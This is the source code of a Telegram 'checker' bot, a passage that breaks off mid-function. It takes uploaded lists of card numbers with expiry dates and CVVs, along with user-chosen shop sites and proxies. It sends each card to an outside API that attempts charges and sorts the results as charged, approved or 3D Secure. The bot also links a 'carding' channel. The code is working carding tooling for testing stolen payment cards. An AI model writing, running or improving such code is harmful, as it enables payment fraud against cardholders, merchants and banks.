"""
AFUONA CHECKER BOT
Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
Telegram: https://t.me/afuonax
Rewritten with aiogram 3.x
"""

import asyncio
import json
import os
import random
import re

import aiofiles
import aiohttp
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
    FSInputFile,
)

# ==================== CONFIG ====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "your_bot_token")
API_BASE_URL = "https://xafuona.3utilities.com"
API_KEY = "afuona_2026"
SECOND_CHANNEL_LINK = "https://t.me/+kxhCcDXQgzQ5MjE0"

USER_SITES_FILE  = "user_sites.json"
USER_PROXIES_FILE = "user_proxies.json"

MAX_SITES        = 10
MAX_PROXIES      = 10
MAX_SITES_FILE   = 100
MAX_PROXIES_FILE = 100
MAX_CARDS_FILE   = 1000
MAX_CARDS        = 1000

active_processes: dict = {}

bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher()

# ==================== INLINE KEYBOARDS ====================

def kb_main():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="💳 CHECK CARDS",  callback_data="check_cards"),
            InlineKeyboardButton(text="🌐 ADD SITES",    callback_data="add_sites"),
        ],
        [
            InlineKeyboardButton(text="🔌 ADD PROXY",    callback_data="add_proxies"),
            InlineKeyboardButton(text="📋 MY SITES",     callback_data="my_sites"),
        ],
        [
            InlineKeyboardButton(text="📋 MY PROXIES",   callback_data="my_proxies"),
            InlineKeyboardButton(text="🧪 TEST SITES",   callback_data="test_sites"),
        ],
        [
            InlineKeyboardButton(text="🧪 TEST PROXIES", callback_data="test_proxies"),
            InlineKeyboardButton(text="ℹ️ USER INFO",    callback_data="user_info"),
        ],
    ])

def kb_start():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="𝙼𝙰𝙸𝙽", url="https://t.me/afuonax"),
            InlineKeyboardButton(text="𝙲𝙰𝚁𝙳𝙸𝙽𝙶", url=SECOND_CHANNEL_LINK),
        ],
        [
            InlineKeyboardButton(text="💳 CHECK CARDS",  callback_data="check_cards"),
            InlineKeyboardButton(text="🌐 ADD SITES",    callback_data="add_sites"),
        ],
        [
            InlineKeyboardButton(text="🔌 ADD PROXY",    callback_data="add_proxies"),
            InlineKeyboardButton(text="📋 MY SITES",     callback_data="my_sites"),
        ],
        [
            InlineKeyboardButton(text="📋 MY PROXIES",   callback_data="my_proxies"),
            InlineKeyboardButton(text="🧪 TEST SITES",   callback_data="test_sites"),
        ],
        [
            InlineKeyboardButton(text="🧪 TEST PROXIES", callback_data="test_proxies"),
            InlineKeyboardButton(text="ℹ️ USER INFO",    callback_data="user_info"),
        ],
    ])

def kb_back_main():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 BACK TO MAIN", callback_data="back_to_main")]
    ])

def kb_back_start():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 BACK", callback_data="back_to_start")]
    ])

def kb_stop(user_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⛔ STOP", callback_data=f"stop:{user_id}")]
    ])

def kb_sites_list(user_sites: list):
    rows = []
    for i in range(min(5, len(user_sites))):
        rows.append([InlineKeyboardButton(
            text=f"🗑️ Remove #{i+1}",
            callback_data=f"removesite_{i}"
        )])
    if len(user_sites) > 5:
        rows.append([InlineKeyboardButton(text="🗑️ Remove All", callback_data="remove_all_sites")])
    rows.append([InlineKeyboardButton(text="🔙 BACK TO MAIN", callback_data="back_to_main")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def kb_proxies_list(user_proxies: list):
    rows = []
    for i in range(min(5, len(user_proxies))):
        rows.append([InlineKeyboardButton(
            text=f"🗑️ Remove #{i+1}",
            callback_data=f"removeproxy_{i}"
        )])
    if len(user_proxies) > 5:
        rows.append([InlineKeyboardButton(text="🗑️ Remove All", callback_data="remove_all_proxies")])
    rows.append([InlineKeyboardButton(text="🔙 BACK TO MAIN", callback_data="back_to_main")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def kb_progress(card: str, response: str, charged: int, approved: int,
                 threed: int, declined: int, checked: int, total: int, user_id: int):
    noop = f"noop:{user_id}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💳 Card ➜ {card[:12]}****",            callback_data=noop)],
        [InlineKeyboardButton(text=f"📨 Response ➜ {response[:28]}",        callback_data=noop)],
        [InlineKeyboardButton(text=f"💎 CHARGE  ➜ [ {charged} ]",           callback_data=noop)],
        [InlineKeyboardButton(text=f"✅ Approve ➜ [ {approved} ]",          callback_data=noop)],
        [InlineKeyboardButton(text=f"🟡 3D Secure ➜ [ {threed} ]",          callback_data=noop)],
        [InlineKeyboardButton(text=f"❌ Decline ➜ [ {declined} ]",          callback_data=noop)],
        [InlineKeyboardButton(text=f"📊 Progress ➜ [{checked}/{total}]",    callback_data=noop)],
        [InlineKeyboardButton(text="⛔ STOP",                                callback_data=f"stop:{user_id}")],
    ])

# ==================== HELPERS ====================

async def load_json(filename):
    try:
        if os.path.exists(filename):
            async with aiofiles.open(filename, 'r') as f:
                content = await f.read()
                return json.loads(content) if content else {}
        return {}
    except Exception as e:
        print(f"Error loading {filename}: {e}")
        return {}

async def save_json(filename, data):
    try:
        async with aiofiles.open(filename, 'w') as f:
            await f.write(json.dumps(data, indent=4))
    except Exception as e:
        print(f"Error saving {filename}: {e}")

def validate_card(text):
    if not text:
        return None
    text = text.replace('\n', ' ').replace('/', ' ').replace('|', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for num in numbers:
        if len(num) == 16 and num.isdigit():
            cc = num
        elif len(num) == 2 and int(num) <= 12 and not mm:
            mm = num
        elif len(num) == 2 and not yy:
            yy = num
        elif len(num) == 4 and num.startswith('20'):
            yy = num[2:]
        elif len(num) in [3, 4] and not cvv:
            cvv = num
    if cc and mm and yy and cvv:
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_cards(content):
    cards = []
    for line in content.splitlines():
        line = line.strip()
        if line and '|' in line:
            parts = line.split('|')
            if len(parts) == 4 and all(p.strip().isdigit() for p in parts):
                cards.append(line.strip())
            else:
                card = validate_card(line)
                if card:
                    cards.append(card)
    return cards

def parse_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    proxy_type = 'http'
    if proxy_str.startswith(('socks5://', 'socks4://', 'https://')):
        m = re.match(r'^(socks5|socks4|https)://', proxy_str)
        if m:
            proxy_type = m.group(1)
            proxy_str  = proxy_str.split('://', 1)[1]

    m = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy_str)
    if m:
        u, p, ip, port = m.groups()
        return f"{proxy_type}://{u}:{p}@{ip}:{port}"

    m = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str)
    if m:
        ip, port, u, p = m.groups()
        return f"{proxy_type}://{u}:{p}@{ip}:{port}"

    m = re.match(r'^([^:@]+):(\d+)$', proxy_str)
    if m:
        ip, port = m.groups()
        return f"{proxy_type}://{ip}:{port}"
    return None

async def test_proxy(proxy_url):
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://api.ipify.org', proxy=proxy_url) as resp:
                if resp.status == 200:
                    return True, (await resp.text()).strip()
                return False, f"HTTP {resp.status}"
    except Exception as e:
        return False, str(e)

async def get_bin_info(card_number):
    try:
        bin_num = card_number[:6]
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://lookup.binlist.net/{bin_num}",
                             headers={'Accept-Version': '3'}) as resp:
                if resp.status == 200:
                    d = await resp.json()
                    return {
                        'brand':   d.get('scheme', 'N/A'),
                        'type':    d.get('type', 'N/A'),
                        'level':   d.get('brand', 'N/A'),
                        'bank':    d.get('bank', {}).get('name', 'N/A'),
                        'country': d.get('country', {}).get('name', 'N/A'),
                        'flag':    d.get('country', {}).get('emoji', '🏳️'),
                    }
    except:
        pass
    return {'brand': 'N/A', 'type': 'N/A', 'level': 'N/A',
            'bank': 'N/A', 'country': 'N/A', 'flag': '🏳️'}

def get_card_status(response_text, status_text):
    rl = response_text.lower()
    if any(x in rl for x in ["charged", "thank you", "order completed"]) or "💎" in response_text:
        return "CHARGED 💎"
    if status_text == "Approved" or "insufficient" in rl:
        return "APPROVED ✅"
    if "3d" in rl or "secure" in rl:
        return "3D SECURE 🟡"
    return None

def format_bold(text):
    bold_map = {
        'A':'𝗔','B':'𝗕','C':'𝗖','D':'𝗗','E':'𝗘','F':'𝗙','G':'𝗚','H':'𝗛','I':'𝗜',
        'J':'𝗝','K':'𝗞','L':'𝗟','M':'𝗠','N':'𝗡','O':'𝗢','P':'𝗣','Q':'𝗤','R':'𝗥',
        'S':'𝗦','T':'𝗧','U':'𝗨','V':'𝗩','W':'𝗪','X':'𝗫','Y':'𝗬','Z':'𝗭',
        'a':'𝗮','b':'𝗯','c':'𝗰','d':'𝗱','e':'𝗲','f':'𝗳','g':'𝗴','h':'𝗵','i':'𝗶',
        'j':'𝗷','k':'𝗸','l':'𝗹','m':'𝗺','n':'𝗻','o':'𝗼','p':'𝗽','q':'𝗾','r':'𝗿',
        's':'𝘀','t':'𝘁','u':'𝘂','v':'𝘃','w':'𝘄','x':'𝘅','y':'𝘆','z':'𝘇',
        '0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵',
    }
    return ''.join(bold_map.get(c, c) for c in text)

# ==================== API ====================

async def check_card_via_api(card, site, proxy):
    try:
        site = site.replace('https://', '').replace('http://', '').split('/')[0]
        formatted = validate_card(card)
        if not formatted:
            return {"Response": "Invalid card format", "Status": "Error"}
        params = {'key': API_KEY, 'site': site, 'cc': formatted, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get(f"{API_BASE_URL}/process", params=params) as resp:
                if resp.status != 200:
                    return {"Response": f"HTTP {resp.status}", "Status": "Error"}
                return await resp.json()
    except Exception as e:
        return {"Response": str(e), "Status": "Error"}

async def test_site_via_api(site, proxy):
    try:
        site = site.replace('https://', '').replace('http://', '').split('/')[0]
        params = {'key': API_KEY, 'site': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get(f"{API_BASE_URL}/test_site", params=params) as resp:
                if resp.status != 200:
                    return {"working": False, "response": f"HTTP {resp.status}"}
                return await resp.json()
    except Exception as e:
        return {"working": False, "response": str(e)}

# ==================== SEND START MENU ====================

async def send_start_menu(target, first_name: str):
    """target = Message or CallbackQuery"""
    text = f"✨ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲, {first_name}!\n𝚍𝚘𝚗'𝚝 𝚏𝚘𝚛𝚐𝚎𝚝 𝚝𝚘 𝚜𝚞𝚋𝚜𝚌𝚛𝚒𝚋𝚎 𝚝𝚘 𝚝𝚑𝚎 𝚌𝚑𝚊𝚗𝚗𝚎𝚕𝚜 ‌♡⁩"
    markup = kb_start()

    chat_id = target.from_user.id if isinstance(target, CallbackQuery) else target.chat.id

    for ext in ['jpg', 'jpeg', 'png']:
        path = f"bot_image.{ext}"
        if os.path.exists(path):
            try:
                if isinstance(target, CallbackQuery):
                    await target.message.delete()
                await bot.send_photo(chat_id, FSInputFile(path),
                                     caption=text, reply_markup=markup)
                return
            except:
                continue

    if isinstance(target, CallbackQuery):
        try:
            await target.message.edit_text(text, reply_markup=markup)
        except:
            await bot.send_message(chat_id, text, reply_markup=markup)
    else:
        await target.answer(text, reply_markup=markup)

async def send_main_menu(target):
    chat_id = target.from_user.id if isinstance(target, CallbackQuery) else target.chat.id
    text = (
        "┏━━━━━━━━━━━━━━━━┓\n"
        f"┃ 💳 {format_bold('Check Cards')}\n"
        f"┃ 🌐 {format_bold('Add Sites')}\n"
        f"┃ 🔌 {format_bold('Add Proxy')}\n"
        f"┃ 📋 {format_bold('My Sites')}\n"
        f"┃ 📋 {format_bold('My Proxies')}\n"
        f"┃ 🧪 {format_bold('Test Sites / Proxies')}\n"
        f"┃ ℹ️ {format_bold('User Info')}\n"
        "┗━━━━━━━━━━━━━━━━┛"
    )
    markup = kb_main()

    for ext in ['jpg', 'jpeg', 'png']:
        path = f"bot_image.{ext}"
        if os.path.exists(path):
            try:
                if isinstance(target, CallbackQuery):
                    await target.message.delete()
                await bot.send_photo(chat_id, FSInputFile(path),
                                     caption=text, reply_markup=markup)
                return
            except:
                continue

    if isinstance(target, CallbackQuery):
        try:
            await target.message.edit_text(text, reply_markup=markup)
        except:
            await bot.send_message(chat_id, text, reply_markup=markup)
    else:
        await target.answer(text, reply_markup=markup)

# ==================== COMMAND HANDLERS ====================

@dp.message(Command("start"))
async def cmd_start(message: Message):
    first_name = message.from_user.first_name or "there"
    await send_start_menu(message, first_name)

@dp.message(Command("add"))
async def cmd_add(message: Message):
    user_id = str(message.from_user.id)
    text = message.text[4:].strip()
    if not text:
        return await message.reply("❌ Usage: /add site1.com site2.com")

    sites_to_add = []
    for word in text.split():
        word = word.replace('https://', '').replace('http://', '').split('/')[0]
        if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\-]*\.[a-zA-Z]{2,}', word):
            sites_to_add.append(word)

    if not sites_to_add:
        return await message.reply("❌ No valid sites found!")

    proxies = await load_json(USER_PROXIES_FILE)
    user_proxies = proxies.get(user_id, [])
    if not user_proxies:
        return await message.reply("❌ You need at least one working proxy to test sites!")

    status_msg = await message.reply(f"🔄 Testing {len(sites_to_add)} sites...")
    proxy = random.choice(user_proxies)['url']
    working_sites = []

    for i, site in enumerate(sites_to_add, 1):
        try:
            await status_msg.edit_text(f"🔄 Testing [{i}/{len(sites_to_add)}]: {site}")
        except:
            pass
        result = await test_site_via_api(site, proxy)
        if result.get('working'):
            working_sites.append(site)
        await asyncio.sleep(0.5)

    sites_data = await load_json(USER_SITES_FILE)
    current_sites = sites_data.get(user_id, [])
    added = []
    for site in working_sites:
        if site not in current_sites and len(current_sites) < MAX_SITES:
            current_sites.append(site)
            added.append(site)
    if added:
        sites_data[user_id] = current_sites
        await save_json(USER_SITES_FILE, sites_data)

    await status_msg.edit_text(
        f"✅ Added {len(added)} working sites. Total: {len(current_sites)}/{MAX_SITES}"
    )

@dp.message(Command("rm"))
async def cmd_rm(message: Message):
    user_id = str(message.from_user.id)
    text = message.text[3:].strip()
    if not text:
        return await message.reply("❌ Usage: /rm site.com or /rm all")

    sites_data = await load_json(USER_SITES_FILE)
    user_sites = sites_data.get(user_id, [])
    if not user_sites:
        return await message.reply("❌ You have no sites to remove!")

    if text.lower() == 'all':
        del sites_data[user_id]
        await save_json(USER_SITES_FILE, sites_data)
        return await message.reply(f"✅ Removed all {len(user_sites)} sites!")

    site_to_remove = text.replace('https://', '').replace('http://', '').split('/')[0]
    if site_to_remove in user_sites:
        user_sites.remove(site_to_remove)
        sites_data[user_id] = user_sites if user_sites else sites_data
        if not user_sites:
            del sites_data[user_id]
        await save_json(USER_SITES_FILE, sites_data)
        await message.reply(f"✅ Removed: {site_to_remove}")
    else:
        await message.reply("❌ Site not found!")

@dp.message(Command("mysites"))
async def cmd_mysites(message: Message):
    user_id = str(message.from_user.id)
    sites_data = await load_json(USER_SITES_FILE)
    user_sites = sites_data.get(user_id, [])
    if not user_sites:
        return await message.reply("❌ You have no saved sites!")
    text = f"📊 Your Sites ({len(user_sites)}/{MAX_SITES}):\n\n"
    for i, site in enumerate(user_sites, 1):
        text += f"{i}. {site}\n"
    await message.reply(text)

@dp.message(Command("addproxy"))
async def cmd_addproxy(message: Message):
    user_id = str(message.from_user.id)
    if message.chat.type != "private":
        return await message.reply("🔒 This command only works in private chat!")

    text = message.text[9:].strip()
    if not text:
        return await message.reply("❌ Usage: /addproxy ip:port or /addproxy ip:port:user:pass")

    proxies = await load_json(USER_PROXIES_FILE)
    user_proxies = proxies.get(user_id, [])
    proxy_url = parse_proxy(text)
    if not proxy_url:
        return await message.reply("❌ Invalid proxy format!")

    status_msg = await message.reply("🔄 Testing proxy...")
    is_working, ip = await test_proxy(proxy_url)
    if not is_working:
        return await status_msg.edit_text("❌ Proxy is not working!")

    if any(p['original'] == text for p in user_proxies):
        return await status_msg.edit_text("⚠️ Proxy already exists!")
    if len(user_proxies) >= MAX_PROXIES:
        return await status_msg.edit_text(f"❌ Max proxies limit ({MAX_PROXIES}) reached!")

    user_proxies.append({'original': text, 'url': proxy_url, 'ip': ip})
    proxies[user_id] = user_proxies
    await save_json(USER_PROXIES_FILE, proxies)
    await status_msg.edit_text(f"✅ Proxy added! (IP: {ip})")

@dp.message(Command("rmproxy"))
async def cmd_rmproxy(message: Message):
    user_id = str(message.from_user.id)
    if message.chat.type != "private":
        return await message.reply("🔒 This command only works in private chat!")

    text = message.text[8:].strip()
    proxies = await load_json(USER_PROXIES_FILE)
    user_proxies = proxies.get(user_id, [])
    if not user_proxies:
        return await message.reply("❌ You have no proxies to remove!")

    if not text:
        pl = "Your proxies:\n\n"
        for i, p in enumerate(user_proxies, 1):
            pl += f"{i}. {p['original']}\n"
        pl += "\nUse /rmproxy [number] or /rmproxy all"
        return await message.reply(pl)

    if text.lower() == 'all':
        del proxies[user_id]
        await save_json(USER_PROXIES_FILE, proxies)
        return await message.reply(f"✅ Removed all {len(user_proxies)} proxies!")

    try:
        idx = int(text) - 1
        if 0 <= idx < len(user_proxies):
            removed = user_proxies.pop(idx)
            proxies[user_id] = user_proxies if user_proxies else proxies
            if not user_proxies:
                del proxies[user_id]
            await save_json(USER_PROXIES_FILE, proxies)
            await message.reply(f"✅ Removed: {removed['original']}")
        else:
            await message.reply(f"❌ Invalid index! Choose 1-{len(user_proxies)}")
    except ValueError:
        await message.reply("❌ Please provide a valid number or 'all'")

@dp.message(Command("myproxies"))
async def cmd_myproxies(message: Message):
    user_id = str(message.from_user.id)
    if message.chat.type != "private":
        return await message.reply("🔒 This command only works in private chat!")
    proxies = await load_json(USER_PROXIES_FILE)
    user_proxies = proxies.get(user_id, [])
    if not user_proxies:
        return await message.reply("❌ You have no saved proxies!")
    text = f"📊 Your Proxies ({len(user_proxies)}/{MAX_PROXIES}):\n\n"
    for i, p in enumerate(user_proxies, 1):
        text += f"{i}. {p['original']} (IP: {p['ip']})\n"
    await message.reply(text)

@dp.message(Command("mtxt"))
async def cmd_mtxt(message: Message):
    user_id = message.from_user.id
    if user_id in active_processes:
        return await message.reply("`Lunch is on the way 🍑 wait until it cools down`",
                                   parse_mode="Markdown")
    if not message.reply_to_message:
        return await message.reply("`Please reply to a .txt file with /mtxt`",
                                   parse_mode="Markdown")

    replied = message.reply_to_message
    if not replied.document:
        return await message.reply("`That's not a file. Please reply to a .txt file.`",
                                   parse_mode="Markdown")

    proxies = await load_json(USER_PROXIES_FILE)
    user_proxies = proxies.get(str(user_id), [])
    if not user_proxies:
        return await message.reply("❌ You need at least one working proxy!")

    sites = await load_json(USER_SITES_FILE)
    user_sites = sites.get(str(user_id), [])
    if not user_sites:
        return await message.reply("❌ You need at least one working site!")

    file_info = await bot.get_file(replied.document.file_id)
    file_path = f"/tmp/{replied.document.file_name or 'cards.txt'}"
    await bot.download_file(file_info.file_path, file_path)

    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
            content = await f.read()
    except:
        async with aiofiles.open(file_path, 'r', encoding='latin-1') as f:
            content = await f.read()

    os.remove(file_path)

    lines = content.splitlines()
    if len(lines) > MAX_CARDS_FILE:
        return await message.reply(
            f"━━━━━━━━━━━━━━\n❌ FILE TOO LARGE\n━━━━━━━━━━━━━\n\n"
            f"Max {MAX_CARDS_FILE} cards per file."
        )

    cards = extract_cards(content)
    if not cards:
        return await message.reply("`❌ No valid cards found in file!`", parse_mode="Markdown")

    active_processes[user_id] = {'type': 'checking_cards'}
    await process_card_check(message, cards[:MAX_CARDS], user_sites, user_proxies)

# ==================== CALLBACK HANDLERS ====================

@dp.callback_query(F.data == "noop")
async def cb_noop(cq: CallbackQuery):
    await cq.answer()

@dp.callback_query(F.data.startswith("noop:"))
async def cb_noop_uid(cq: CallbackQuery):
    await cq.answer()

@dp.callback_query(F.data == "back_to_start")
async def cb_back_start(cq: CallbackQuery):
    await cq.answer()
    first_name = cq.from_user.first_name or "there"
    await send_start_menu(cq, first_name)

@dp.callback_query(F.data == "back_to_main")
async def cb_back_main(cq: CallbackQuery):
    await cq.answer()
    await send_main_menu(cq)

@dp.callback_query(F.data == "main_menu")
async def cb_main_menu(cq: CallbackQuery):
    await cq.answer()
    await send_main_menu(cq)

@dp.callback_query(F.data == "check_cards")
async def cb_check_cards(cq: CallbackQuery):
    await cq.answer()
    text = (
        "┏━━━━━━━━━━━━━━━━┓\n"
        f"┃ 📤 {format_bold('Send me a .txt file with your cards.')}\n"
        f"┃ 📊 {format_bold('Limits:')}\n"
        f"┃ • {format_bold('Max cards per file')}: {MAX_CARDS_FILE}\n"
        f"┃ 📝 {format_bold('Format')}: number|mm|yy|cvv\n"
        f"┃ ✦ {format_bold('Example')}: 4242424242424242|12|25|123\n"
        "┗━━━━━━━━━━━━━━━━┛"
    )
    try:
        await cq.message.edit_text(text, reply_markup=kb_back_main())
    except:
        await cq.message.answer(text, reply_markup=kb_back_main())
    active_processes[cq.from_user.id] = {'type': 'waiting_cards'}

@dp.callback_query(F.data == "add_sites")
async def cb_add_sites(cq: CallbackQuery):
    await cq.answer()
    text = (
        "┏━━━━━━━━━━━━━━━━┓\n"
        f"┃ 📤 {format_bold('Send a .txt file or paste sites.')}\n"
        f"┃ 📊 {format_bold('Limits:')} Max {MAX_SITES_FILE} sites / {MAX_SITES} saved\n"
        f"┃ ✦ {format_bold('Example')}: shop.com  |  example.com\n"
        f"┃ ⚠️ {format_bold('Only working sites will be saved.')}\n"
        "┗━━━━━━━━━━━━━━━━┛"
    )
    try:
        await cq.message.edit_text(text, reply_markup=kb_back_main())
    except:
        await cq.message.answer(text, reply_markup=kb_back_main())
    active_processes[cq.from_user.id] = {'type': 'waiting_sites'}

@dp.callback_query(F.data == "add_proxies")
async def cb_add_proxies(cq: CallbackQuery):
    await cq.answer()
    text = (
        "┏━━━━━━━━━━━━━━━━┓\n"
        f"┃ 📤 {format_bold('Send a .txt file or paste proxies.')}\n"
        f"┃ 📊 {format_bold('Limits:')} Max {MAX_PROXIES_FILE} / {MAX_PROXIES} saved\n"
        f"┃ 🔧 {format_bold('Formats:')}\n"
        "┃ • ip:port\n"
        "┃ • ip:port:user:pass\n"
        "┃ • user:pass@ip:port\n"
        "┃ • socks5://ip:port\n"
        f"┃ ⚠️ {format_bold('Only working proxies will be saved.')}\n"
        "┗━━━━━━━━━━━━━━━━┛"
    )
    try:
        await cq.message.edit_text(text, reply_markup=kb_back_main())
    except:
        await cq.message.answer(text, reply_markup=kb_back_main())
    active_processes[cq.from_user.id] = {'type': 'waiting_proxies'}

@dp.callback_query(F.data == "my_sites")
async def cb_my_sites(cq: CallbackQuery):
    await cq.answer()
    await _show_my_sites(cq)

@dp.callback_query(F.data == "my_proxies")
async def cb_my_proxies(cq: CallbackQuery):
    await cq.answer()
    await _show_my_proxies(cq)

@dp.callback_query(F.data == "test_sites")
async def cb_test_sites(cq: CallbackQuery):
    await cq.answer()
    await _start_test_sites(cq)

@dp.callback_query(F.data == "test_proxies")
async def cb_test_proxies(cq: CallbackQuery):
    await cq.answer()
    await _start_test_proxies(cq)

@dp.callback_query(F.data == "user_info")
async def cb_user_info(cq: CallbackQuery):
    await cq.answer()
    user_id = str(cq.from_user.id)
    sites_data   = await load_json(USER_SITES_FILE)
    proxies_data = await load_json(USER_PROXIES_FILE)
    sc = len(sites_data.get(user_id, []))
    pc = len(proxies_data.get(user_id, []))
    text = (
        "┏━━━━━━━━━━━━━━━━┓\n"
        f"┃ 🆔 {format_bold('User ID')}: `{cq.from_user.id}`\n"
        f"┃ 🧑 {format_bold('Username')}: @{cq.from_user.username or 'N/A'}\n"
        f"┃ 📛 {format_bold('Name')}: {cq.from_user.first_name or 'N/A'}\n"
        f"┃ 🌐 {format_bold('Sites')}: {sc}/{MAX_SITES}\n"
        f"┃ 🔌 {format_bold('Proxies')}: {pc}/{MAX_PROXIES}\n"
        "┗━━━━━━━━━━━━━━━━┛"
    )
    try:
        await cq.message.edit_text(text, reply_markup=kb_back_main(), parse_mode="Markdown")
    except:
        await cq.message.answer(text, reply_markup=kb_back_main(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("removesite_"))
async def cb_removesite(cq: CallbackQuery):
    idx = int(cq.data.split("_")[1])
    user_id = str(cq.from_user.id)
    sites_data = await load_json(USER_SITES_FILE)
    user_sites = sites_data.get(user_id, [])
    if 0 <= idx < len(user_sites):
        removed = user_sites.pop(idx)
        if user_sites:
            sites_data[user_id] = user_sites
        elif user_id in sites_data:
            del sites_data[user_id]
        await save_json(USER_SITES_FILE, sites_data)
        await cq.answer(f"✅ Removed: {removed}", show_alert=True)
    else:
        await cq.answer("❌ Invalid index!", show_alert=True)
    await _show_my_sites(cq)

@dp.callback_query(F.data.startswith("removeproxy_"))
async def cb_removeproxy(cq: CallbackQuery):
    idx = int(cq.data.split("_")[1])
    user_id = str(cq.from_user.id)
    proxies_data = await load_json(USER_PROXIES_FILE)
    user_proxies = proxies_data.get(user_id, [])
    if 0 <= idx < len(user_proxies):
        removed = user_proxies.pop(idx)
        if user_proxies:
            proxies_data[user_id] = user_proxies
        elif user_id in proxies_data:
            del proxies_data[user_id]
        await save_json(USER_PROXIES_FILE, proxies_data)
        await cq.answer(f"✅ Removed: {removed['original']}", show_alert=True)
    else:
        await cq.answer("❌ Invalid index!", show_alert=True)
    await _show_my_proxies(cq)

@dp.callback_query(F.data == "remove_all_sites")
async def cb_remove_all_sites(cq: CallbackQuery):
    user_id = str(cq.from_user.id)
    sites_data = await load_json(USER_SITES_FILE)
    if user_id in sites_data:
        count = len(sites_data[user_id])
        del sites_data[user_id]
        await save_json(USER_SITES_FILE, sites_data)
        await cq.answer(f"✅ Removed all {count} sites!", show_alert=True)
    else:
        await cq.answer("❌ No sites to remove!", show_alert=True)
    await _show_my_sites(cq)

@dp.callback_query(F.data == "remove_all_proxies")
async def cb_remove_all_proxies(cq: CallbackQuery):
    user_id = str(cq.from_user.id)
    proxies_data = await load_json(USER_PROXIES_FILE)
    if user_id in proxies_data:
        count = len(proxies_data[user_id])
        del proxies_data[user_id]
        await save_json(USER_PROXIES_FILE, proxies_data)
        await cq.answer(f"✅ Removed all {count} proxies!", show_alert=True)
    else:
        await cq.answer("❌ No proxies to remove!", show_alert=True)
    await _show_my_proxies(cq)

@dp.callback_query(F.data.startswith("stop:"))
async def cb_stop(cq: CallbackQuery):
    target_uid = int(cq.data.split(":")[1])
    if cq.from_user.id != target_uid:
        return await cq.answer("❌ Not your process!", show_alert=True)
    if target_uid in active_processes:
        active_processes.pop(target_uid, None)
        await cq.answer("⛔ Stopped!", show_alert=True)
        try:
            await cq.message.edit_text("`⛔ Process stopped by user`", parse_mode="Markdown")
        except:
            pass
    else:
        await cq.answer("❌ No active process!", show_alert=True)

# ==================== SHARED DISPLAY FUNCTIONS ====================

async def _show_my_sites(target):
    """target = CallbackQuery or Message"""
    if isinstance(target, CallbackQuery):
        user_id = str(target.from_user.id)
        edit_fn = target.message.edit_text
        send_fn = target.message.answer
    else:
        user_id = str(target.from_user.id)
        edit_fn = None
        send_fn = target.reply

    sites_data = await load_json(USER_SITES_FILE)
    user_sites = sites_data.get(user_id, [])

    if not user_sites:
        text = (
            "┏━━━━━━━━━━━━━━━━┓\n"
            f"┃ ❌ {format_bold('You have no saved sites.')}\n"
            f"┃ {format_bold('Use ADD SITES to add some.')}\n"
            "┗━━━━━━━━━━━━━━━━┛"
        )
        markup = kb_back_main()
    else:
        site_list = "".join(f" {i}. `{s}`\n" for i, s in enumerate(user_sites, 1))
        text = (
            "┏━━━━━━━━━━━━━━━━┓\n"
            f"┃ 📊 {format_bold('Total')}: {len(user_sites)}/{MAX_SITES}\n\n"
            f"{site_list}"
            "┗━━━━━━━━━━━━━━━━┛"
        )
        markup = kb_sites_list(user_sites)

    if edit_fn:
        try:
            await edit_fn(text, reply_markup=markup, parse_mode="Markdown")
            return
        except:
            pass
    await send_fn(text, reply_markup=markup, parse_mode="Markdown")

async def _show_my_proxies(target):
    if isinstance(target, CallbackQuery):
        user_id = str(target.from_user.id)
        edit_fn = target.message.edit_text
        send_fn = target.message.answer
    else:
        user_id = str(target.from_user.id)
        edit_fn = None
        send_fn = target.reply

    proxies_data = await load_json(USER_PROXIES_FILE)
    user_proxies = proxies_data.get(user_id, [])

    if not user_proxies:
        text = (
            "┏━━━━━━━━━━━━━━━━┓\n"
            f"┃ ❌ {format_bold('You have no saved proxies.')}\n"
            f"┃ {format_bold('Use ADD PROXY to add some.')}\n"
            "┗━━━━━━━━━━━━━━━━┛"
        )
        markup = kb_back_main()
    else:
        plist = "".join(f" {i}. `{p['original']}`\n" for i, p in enumerate(user_proxies, 1))
        text = (
            "┏━━━━━━━━━━━━━━━━┓\n"
            f"┃ 📊 {format_bold('Total')}: {len(user_proxies)}/{MAX_PROXIES}\n\n"
            f"{plist}"
            "┗━━━━━━━━━━━━━━━━┛"
        )
        markup = kb_proxies_list(user_proxies)

    if edit_fn:
        try:
            await edit_fn(text, reply_markup=markup, parse_mode="Markdown")
            return
        except:
            pass
    await send_fn(text, reply_markup=markup, parse_mode="Markdown")

async def _start_test_sites(cq: CallbackQuery):
    user_id = str(cq.from_user.id)
    int_uid  = cq.from_user.id

